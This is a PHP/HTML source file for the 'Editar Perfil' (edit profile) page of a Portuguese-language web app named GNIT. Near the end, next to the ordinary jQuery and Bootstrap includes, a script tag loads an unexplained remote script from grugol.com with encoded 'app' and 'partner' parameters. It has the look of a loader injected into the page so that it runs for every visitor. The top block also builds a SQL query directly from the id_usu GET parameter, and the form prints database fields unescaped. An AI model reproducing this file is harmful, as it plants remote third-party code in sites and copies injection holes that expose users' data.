<?php

include 'configs/conexao.php';

if (!isset($_SESSION)) {
  session_start();
}
$id_usu = $_GET["id_usu"];
$sql = "SELECT * FROM usuário WHERE cd_usu = $id_usu";
$res = $conn->query($sql);
$dados = $res->fetch_object();

?>



<html lang="pt-BR">

<head>

  <meta charset="UTF-8" />
  <title>Editar Perfil - GNIT</title>
  <meta charset="UTF-8">

  <!--Os arquivos Meta-->
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <meta name="description" content="GNIT">
  <meta name="author" content="">
  <!--Fim dos arquivos Meta-->

  <!--Os Arquivos CSS-->
  <link href="css/bootstrap.min.css" rel="stylesheet">
  <link href="css/bootstrap-responsive.min.css" rel="stylesheet">
  <link href="css/template.css" rel="stylesheet">


  <!--HTML5 shim,for IE6-8 support of HTML5 elements -->
  <!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

</head>

<body>

  <!-- Modal -->
  <div class="modal fade" id="edition-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
          <h4 class="modal-title" id="modalLabel">Cancelar edição</h4>
        </div>
        <div class="modal-body">
          Deseja realmente cancelar essa edição?
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary">Sim</button>
          <button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
        </div>
      </div>
    </div>
  </div>

  <nav class="navbar navbar-default navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="propriedades.php"><b>GNIT</b></a>
      </div>
      <div id="navbar" class="navbar-collapse collapse">
        <ul class="nav navbar-nav">

          <li><a href="quem.php">Quem Somos</a></li>
          <li><a href="contato.php">Contato</a></li>

        </ul>
        <ul class="nav navbar-nav navbar-right">


          <!--<li class="active"><a href="./">Fixed top <span class="sr-only">(current)</span></a></li>-->
          <div id="perfil">
            <span style="vertical-align:middle; padding-right:10px"> <i><?php echo $_SESSION['nome']; ?></i></span>
            <a href="minhaconta.php"><img src="https://via.placeholder.com/40" class="img-circle"></a>
          </div>
        </ul>
      </div><!--/.nav-collapse -->
    </div>
  </nav> <!--Final da NavBar-->



  <div class="container-fluid" style="margin-top:80px;">
    <div class="row">
      <div class="col-md-2" id="menu-esquerdo">
        <p><img src="img/nit.jpg" style="margin-left:15px"></p>
        <ul class="nav nav-pills nav-stacked">
          <li role="presentation"><a href="propriedades.php"><img src="img/dashboard.png"> DashBoard</a></li>
          <li role="presentation"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Notificações</a></li>
          <li role="presentation" class="active"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
          <li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
          <li role="presentation"><a href="index.php"><img src="img/sair.png"> Sair</a></li>
        </ul>
      </div> <!--Final Menu Esquerdo-->
      <div class="col-md-10">
        <form class="form-horizontal" action="configs/usuario_editar.php" method="POST">
          <input type="hidden" name="id" value="<?php print $dados->cd_usu; ?>">
          <fieldset>


            <legend style="text-align:center;">Preencha os campos abaixo para editar seu perfil</legend>


            <div class="form-group">
              <label class="col-md-4 control-label" for="login">Login:</label>
              <div class="col-md-4">
                <input id="textinput" name="login" type="text" value="<?php print $dados->lg_usu; ?>" required="true" class="form-control input-md">
                <span class="help-block">Login para acessar o sistema</span>
              </div>
            </div>


            <div class="form-group">
              <label class="col-md-4 control-label" for="senha">Senha:</label>
              <div class="col-md-4">
                <input id="textinput" name="senha" type="password" placeholder="Senha" required="true" class="form-control input-md">
                <span class="help-block">Senha para acessar o sistema</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="nome">Nome</label>
              <div class="col-md-4">
                <input id="textinput" name="nome" type="text" value="<?php print $dados->nome_usu; ?>" required="true" class="form-control input-md">
                <span class="help-block">Nome completo</span>
              </div>
            </div>



            <div class="form-group">
              <label class="col-md-4 control-label" for="cpf">CPF:</label>
              <div class="col-md-4">
                <input id="textinput" name="cpf" type="text" value="<?php print $dados->cpf_usu; ?>" required="true" class="form-control input-md">
                <span class="help-block">Sem traços ou Pontos</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="vinculo">Vínculo Empregatício: </label>
              <div class="col-md-4">
                <select id="selectbasic" name="vinculo" required="true" required="true" class="form-control">
                  <option value="1">Bolsista</option>
                  <option value="2">Coordenador(a)</option>
                </select>
                <span class="help-block">Selecione o vínculo empregatício</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="tel">Telefone:</label>
              <div class="col-md-4">
                <input id="textinput" name="tel" type="tel" value="<?php print $dados->tel_usu; ?>" required="true" class="form-control input-md">
                <span class="help-block">com DDD, sem parênteses</span>
              </div>
            </div>
            <div class="form-group">
              <label class="col-md-4 control-label" for="email">E-mail</label>
              <div class="col-md-4">
                <input id="passwordinput" name="email" type="email" placeholder="para entrar no sistema" required="true" class="form-control input-md">
                <span class="help-block">E-mail do usuário</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="expediente">Horário de Expediente </label>
              <div class="col-md-4">
                <select id="selectbasic" name="expediente" required="true" required="true" class="form-control">
                  <option value="1">08h às 12h</option>
                  <option value="2">13h às 17h</option>
                  <option value="2">08h às 17h</option>
                </select>
                <span class="help-block">Selecione o horário de expediente</span>
              </div>
            </div>

            <div class="form-group">
              <label class="col-md-4 control-label" for="endereco">Endereço</label>
              <div class="col-md-4">
                <input id="textinput" name="endereco" type="text" value="<?php print $dados->end_usu; ?>" required="true" class="form-control input-md">
                <span class="help-block">Rua, Bairro e Número </span>
              </div>
            </div>



            <div class="form-group">
              <label class="col-md-4 control-label" for="button1id"></label>
              <div class="col-md-8">
                <button id="button1id" type="submit" name="button1id" class="btn btn-success">enviar</button>
                <a href="propriedades.php"><button id="" name="" class="btn btn-inverse">cancelar</button></a>
              </div>
            </div>


          </fieldset>
        </form>
      </div>

    </div>


    <hr>

    <div class="row">
      <div class="col-md-12">
        <footer>
          <h3>&copy GNIT - Todos os Direitos Reservados</h3>
        </footer>
      </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

    <!-- Latest compiled and minified JavaScript -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    <script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
</body>
</body>

</html>

</html>